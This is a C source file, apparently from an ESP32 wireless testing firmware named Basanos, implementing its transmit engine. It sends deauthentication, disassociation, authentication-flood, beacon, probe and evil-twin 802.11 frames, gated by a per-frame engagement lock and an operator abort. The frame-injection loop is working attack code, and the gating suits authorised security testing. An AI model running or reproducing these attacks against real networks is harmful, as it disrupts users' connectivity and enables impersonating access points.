/* Basanos — the transmit engine. SPDX-License-Identifier: MIT */
#include "transmit.h"
#include "board.h"
#include "frames.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include <stdio.h>
#include <string.h>

static const char *TAG = "bas_tx";

bool bas_tx_supported(bas_family_t f)
{
    switch (f) {
    case BAS_FAM_PROBE_REQ:
    case BAS_FAM_BEACON:
    case BAS_FAM_EVIL_TWIN:
    case BAS_FAM_AUTH_FLOOD:
    case BAS_FAM_DISASSOC:
    case BAS_FAM_DEAUTH:
        return true;
    default:
        return false;
    }
}

const char *bas_tx_pending_reason(bas_family_t f)
{
    switch (f) {
    case BAS_FAM_BLE_ADV:
    case BAS_FAM_BLE_TRACKER:
        return "needs the BLE stack";
    case BAS_FAM_HID_TIMING:
        return "needs the USB HID stack";
    case BAS_FAM_KARMA_RESP:
        return "needs the promiscuous receiver";
    default:
        return "";
    }
}

static uint32_t now_ms(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000);
}

/* Directed families address a specific station inside the lock. Advertisement
 * families are broadcast by definition and deny nothing to anybody, so they
 * are gated on carrying the test prefix instead of on a destination. */
static bool is_directed(bas_family_t f)
{
    return f == BAS_FAM_DEAUTH || f == BAS_FAM_DISASSOC ||
           f == BAS_FAM_AUTH_FLOOD;
}

esp_err_t bas_tx_run(const bas_plan_t *plan,
                     const bas_engagement_t *e,
                     uint8_t role,
                     bas_tx_tick_cb tick, void *ctx,
                     bas_tx_result_t *out)
{
    bas_tx_result_t r;
    memset(&r, 0, sizeof(r));

    if (plan == NULL || e == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (!bas_tx_supported(plan->fam)) {
        return ESP_ERR_NOT_SUPPORTED;
    }

    /* Revalidate here rather than trusting the caller's earlier check. A plan
     * validated a minute ago under a different role or a live engagement is
     * not evidence about now. */
    bas_plan_t p = *plan;
    bas_err_t vc = bas_plan_validate(&p, role, e, now_ms());
    if (vc != BAS_OK) {
        ESP_LOGW(TAG, "refused: %s", bas_err_str(vc));
        r.stopped_by = vc;
        if (out != NULL) { *out = r; }
        return ESP_ERR_INVALID_STATE;
    }

    uint8_t ch = (p.channel != 0u) ? p.channel : e->target.channel;
    esp_err_t rc = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (rc != ESP_OK) {
        ESP_LOGE(TAG, "set_channel %u: %s", (unsigned)ch, esp_err_to_name(rc));
        return rc;
    }

    /* The station the directed families address: the specific client when the
     * engagement names one, otherwise the access point itself. Never a
     * broadcast address — the gate below refuses that regardless. */
    uint8_t dst[6];
    if (e->has_client) {
        memcpy(dst, e->client, 6);
    } else {
        memcpy(dst, e->target.bssid, 6);
    }

    const uint32_t period_ms = (p.pps > 0u) ? (1000u / p.pps) : 100u;
    const uint32_t total     = bas_plan_frame_budget(&p);
    const uint32_t start     = now_ms();
    const uint32_t deadline  = start + (uint32_t)p.seconds * 1000u;

    ESP_LOGI(TAG, "run: %s ch%u %u pps for %us (%u frames) at %02X:%02X:%02X:%02X:%02X:%02X",
             bas_family(p.fam)->name, (unsigned)ch, (unsigned)p.pps,
             (unsigned)p.seconds, (unsigned)total,
             dst[0], dst[1], dst[2], dst[3], dst[4], dst[5]);

    uint8_t  buf[BAS_FRAME_MAX];
    uint16_t seq = 0;
    uint32_t last_tick = start;

    while (now_ms() < deadline && r.frames_sent < total) {
        uint32_t t = now_ms();

        /* Per frame, not per run. This is what makes an expiring engagement
         * stop a burst that is already in flight. */
        if (is_directed(p.fam)) {
            bas_err_t g = bas_engage_permits_frame(e, dst, e->target.bssid, t);
            if (g != BAS_OK) {
                r.frames_refused++;
                r.stopped_by = g;
                ESP_LOGW(TAG, "gate stopped run: %s", bas_err_str(g));
                break;
            }
        } else {
            bas_err_t g = bas_engage_check(e, t);
            if (g != BAS_OK) {
                r.stopped_by = g;
                break;
            }
        }

        size_t len = 0;
        uint8_t synth[6];

        switch (p.fam) {
        case BAS_FAM_DEAUTH:
            len = bas_frame_deauth(buf, dst, e->target.bssid, e->target.bssid,
                                   p.reason_code, seq);
            break;
        case BAS_FAM_DISASSOC:
            len = bas_frame_disassoc(buf, dst, e->target.bssid, e->target.bssid,
                                     p.reason_code, seq);
            break;
        case BAS_FAM_AUTH_FLOOD:
            /* Each request comes from a different synthetic station, which is
             * what actually pressures the association table. */
            bas_frame_synth_mac(synth, seq);
            len = bas_frame_auth(buf, e->target.bssid, synth, seq);
            break;
        case BAS_FAM_BEACON: {
            char ssid[33];
            snprintf(ssid, sizeof(ssid), BAS_TEST_PREFIX "%02u",
                     (unsigned)(seq % 24u));
            bas_frame_synth_mac(synth, seq % 24u);
            len = bas_frame_beacon(buf, synth, ssid, ch, seq);
            break;
        }
        case BAS_FAM_PROBE_REQ:
            bas_frame_synth_mac(synth, seq);
            len = bas_frame_probe_req(buf, synth, NULL, ch, seq);
            break;
        case BAS_FAM_EVIL_TWIN: {
            /* The one place a name that is not ours goes on air: a duplicate
             * of the network under test, from a synthetic BSSID. Permitted
             * only because the engagement is locked to that exact SSID, and
             * never for any other name. */
            bas_frame_synth_mac(synth, 0xE7u);
            len = bas_frame_twin(buf, synth, e->target.ssid, ch, true, seq);
            break;
        }
        default:
            len = 0;
            break;
        }

        if (len == 0u) {
            r.tx_errors++;
            break;
        }

        rc = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
        if (rc == ESP_OK) {
            r.frames_sent++;
        } else {
            r.tx_errors++;
            if (r.tx_errors < 4u) {
                ESP_LOGW(TAG, "tx: %s", esp_err_to_name(rc));
            }
        }
        seq = (uint16_t)((seq + 1u) & 0x0FFFu);

        if (tick != NULL && (t - last_tick) >= 100u) {
            last_tick = t;
            r.elapsed_ms = t - start;
            if (!tick(&r, ctx)) {
                r.stopped_by = BAS_OK;   /* operator abort is not an error */
                break;
            }
        }

        vTaskDelay(pdMS_TO_TICKS(period_ms > 0u ? period_ms : 1u));
    }

    r.elapsed_ms = now_ms() - start;
    ESP_LOGI(TAG, "done: %u sent, %u refused, %u errors, %u ms",
             (unsigned)r.frames_sent, (unsigned)r.frames_refused,
             (unsigned)r.tx_errors, (unsigned)r.elapsed_ms);

    if (out != NULL) {
        *out = r;
    }
    return ESP_OK;
}
